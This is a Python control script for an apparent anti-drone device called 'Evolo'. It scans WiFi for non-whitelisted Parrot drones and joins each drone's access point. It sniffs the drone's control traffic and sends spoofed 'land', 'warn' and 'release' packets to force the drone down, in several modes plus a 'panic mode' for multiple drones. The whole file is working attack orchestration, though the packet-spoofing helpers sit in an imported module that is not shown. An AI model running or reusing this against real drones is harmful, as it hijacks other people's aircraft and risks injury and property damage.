from time import sleep
import threading
import logging

from evolo import *

#configurations
logging.basicConfig(filename='logger.log',level=logging.INFO)

#global constants
interfaceForScanC = "wlan1"
interfaceToConnectC = "wlan0"

############################
#Process for normal attacks#
############################
def attack(parrotsAP):
	global attackInProgress, underattack, interfaceForScan, interfaceToConnect
	logging.info("Attack started")
	arduinoLCD("Attack started")

	if not connectTo(parrotsAP, interfaceToConnect):
		logging.error("Could not connect to parrot at %s, exiting", parrotsAP.ssid)
		arduinoLCD("Can't connect, exit ")
		underattack = []
		attackInProgress = 0
		return

	if attackInProgress == 2: #if panic mode started, quit
		return

	wifiDistance = getWifiDistance(interfaceToConnect, parrotsAP)

	logging.info("Succesfully connected to %s", parrotsAP.ssid)
	arduinoLCD("Connected to drone")

	srcMAC, dstMAC, srcIP, dstIP, segNr = sniffParrotCommunication(interfaceToConnect)

	if attackInProgress == 2: #if panic mode started, quit
		return

	if srcMAC != "": #only attack if sniffing was successfull. Otherwise simply quit
		if mode == "Aggressive":
			arduinoLCD("Sending land commands")
			sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10) #send 10 land packet
		elif mode == "Moderate":
			arduinoLCD("Sending warn commands")
			sendSpoofedParrotPacket("warn", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
			logging.info("Wait for 5 seconds")
			arduinoLCD("Wait 5 sec")
			sleep(5) #original idea was 10 here, I changed it to 5 for debugging
			logging.info("Wait ended")
			if attackInProgress == 2: #if panic mode started, quit
				return
			logging.info("Send release packet")
			arduinoLCD("Sending release command")
			sendSpoofedParrotPacket("release", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, 1, 1)
			logging.info("Wait for 5 seconds")

			sleep(5)
			logging.info("Wait ended")
			if attackInProgress == 2: #if panic mode started, quit
				return
			if getWifiDistance(interfaceToConnect, parrotsAP) > 0: #if the drone is still in wifi range land it
				logging.info("Sending land commands")
				arduinoLCD("Sending land commands")
				sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
		elif mode == "Gracious":
			while getWifiDistance(interfaceToConnect, parrotsAP) > 0: #while the drone is in wifi range
				if wifiDistance * 0.9 > getWifiDistance(interfaceToConnect, parrotsAP): #if it is coming closer, land it
					arduinoLCD("Sending land commands")
					sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
					break
				else: #otherwise warn again
					arduinoLCD("Sending warn commands")
					sendSpoofedParrotPacket("warn", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
					sleep(10)

					if attackInProgress == 2: #if panic mode started, quit
						return

					arduinoLCD("Sending release command")
					sendSpoofedParrotPacket("release", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, 1, 1)
					sleep(5)
					if attackInProgress == 2: #if panic mode started, quit
						return
	else:
		logging.error("No communication toward parrot at %s, exiting", parrotsAP.ssid)
		arduinoLCD("No com to " + parrotsAP.ssid)
		#switch interfaces
		tmp = interfaceForScan
		interfaceForScan = interfaceToConnect
		interfaceToConnect = tmp
		logging.info("Interfaces switched")
	#if attack finished, clean up the global variables
	arduinoLCD("Attack finished")
	sleep(2)
	underattack = []
	attackInProgress = 0
	disconnectFromWifi(interfaceToConnect)
	logging.info("Attack finished")

##########################################
#Panic mode if multiple drones are coming#
##########################################
def panicMode():
	global underattack, attackInProgress, interfaceForScan, interfaceToConnect
	arduinoLCD("Panic mode started")
	while len(underattack) > 0:
		current = underattack.pop(0) #get the first parrot
		if not connectToByMAC(current, interfaceToConnect):
			continue #skip if unable to connect
		arduinoLCD("Connected to drone")
		srcMAC, dstMAC, srcIP, dstIP, segNr = sniffParrotCommunication(interfaceToConnect)
		if srcMAC == "":
			continue #skip if sniffing timeouts
		arduinoLCD("Land the drone")
		sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 3) #send 3 land packet
	attackInProgress = 0
	disconnectFromWifi(interfaceToConnect)

#####################
#Program starts here#
#####################
if __name__ == '__main__':
	global mode, Range, underattack, attackInProgress, attackT, interfaceForScan, interfaceToConnect
	interfaceForScan = interfaceForScanC
	interfaceToConnect = interfaceToConnectC
	logging.info("Evolo has started")
	startArduino()
	arduinoLCD("Evolo started")
	disconnectFromWifi(interfaceForScan)
	disconnectFromWifi(interfaceToConnect)
	sleep(5)
	logging.info("Evolo is ready for operation")
	arduinoLCD("Evolo is ready")
	underattack = []
	attackInProgress = 0 #0 - no attack, 1 - normal attack, 2 - panic mode
	mode = ""
	Range = ""
	while True: #scan, attack, repeat
		mode = readKnobState()
		logging.info("mode: %s", mode)
		if mode != "Off":
			whitelist, Range = readConfig()
			newParrots = scanForParrots(interfaceForScan, whitelist, underattack)
		if mode != "Off" and len(newParrots) > 0: #only work if there are new drones nearby
			if attackInProgress == 0 and len(newParrots) == 1: #no attack in progress, only one parrot found
				underattack = getAPsMAC(newParrots)
				attackInProgress = 1
				attackT = threading.Thread(target=attack, args=(newParrots[0],)) # launch normal attack
				attackT.daemon = True
				attackT.start()
			elif attackInProgress == 0 and len(newParrots) > 1: #no attack in progress, more than one parrot found -> panic mode
				attackInProgress = 2
				underattack = getAPsMAC(newParrots)
				panicModeT = threading.Thread(target=panicMode, args=())
				panicModeT.daemon = True
				panicModeT.start()
			elif attackInProgress == 1: #if there is a normal attack in progress, but there is an other parrot coming
				attackInProgress = 2
				#attackT.terminate() #can't terminate a thread
				disconnectFromWifi(interfaceToConnect)
				underattack += getAPsMAC(newParrots)
				panicModeT = threading.Thread(target=panicMode, args=())
				panicModeT.daemon = True
				panicModeT.start()
			elif attackInProgress == 2: #already in panic mode, add new parrots
				underattack += getAPsMAC(newParrots)
		else: #no drone: wait and scan again
			sleep(1)
